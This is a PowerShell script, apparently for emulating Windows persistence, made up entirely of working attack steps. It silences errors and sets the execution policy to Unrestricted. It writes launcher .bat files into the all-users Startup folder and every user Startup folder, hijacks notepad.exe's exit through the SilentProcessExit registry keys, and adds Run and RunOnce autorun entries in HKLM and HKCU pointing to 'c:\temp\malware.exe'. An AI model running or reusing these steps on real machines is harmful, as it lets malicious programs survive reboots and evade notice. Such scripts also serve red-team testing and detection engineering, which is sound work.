$ErrorActionPreference = "SilentlyContinue"
$DebugPreference = "SilentlyContinue"

$ep = Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -Scope CurrentUser -Force -ExecutionPolicy Unrestricted

"C:\Windows\System32\calc.exe" | Out-File -FilePath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\calc.bat" -Encoding ascii

$path = "C:\Users\"
$filename = "powershell.bat"
Get-ChildItem -Path $path -Recurse -Directory -Force | Where-Object {$_.FullName -match "Startup"} | ForEach-Object {"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" | Out-File -FilePath "$($_.FullName)\$($filename)" -Encoding ascii}

echo "Persistence created for Startup Folders"

Set-ItemProperty HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe -Name GlobalFlag -Value 0x200 -Type Dword
Set-ItemProperty HKLM:\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe -Name ReportingMode -Value 0x1 -Type Dword
Set-ItemProperty HKLM:\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe -Name MonitorProcess -Value "c:\temp\malware.exe" -Type String
Set-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -Name Malware -Value "c:\temp\malware.exe" -Type String
Set-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name Malware -Value "c:\temp\malware.exe" -Type String
Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Malware -Value "c:\temp\malware.exe" -Type String
Set-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name Malware -Value "c:\temp\malware.exe" -Type String

echo "Persistence created for Autorun"